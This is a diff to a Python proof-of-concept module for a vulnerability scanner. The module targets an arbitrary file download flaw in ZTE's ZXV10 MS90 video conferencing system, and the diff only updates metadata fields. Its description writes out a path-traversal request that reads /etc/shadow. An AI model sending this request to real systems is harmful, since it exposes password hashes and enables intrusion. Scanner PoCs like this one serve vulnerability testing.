@@ -5,7 +5,7 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re, urlparse
 
 class Vuln(ABVuln):
-    vuln_id = 'ZTE_0001'  # 平台漏洞编号，留空
+    poc_id = '5571f971-6aad-49aa-bc4b-8b0312d4285d'
     name = '中兴ZXV10 MS90 远程视频会议系统任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
@@ -13,9 +13,9 @@ class Vuln(ABVuln):
     desc = '''
         中兴ZXV10 MS90 远程视频会议系统任意文件下载：conf_control/download.jsp?filename=dd.txt&filePath=/../../../../etc/shadow
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = 'ZTE'  # 漏洞应用名称
     product_version = '中兴ZXV10 MS90'  # 漏洞应用版本
 
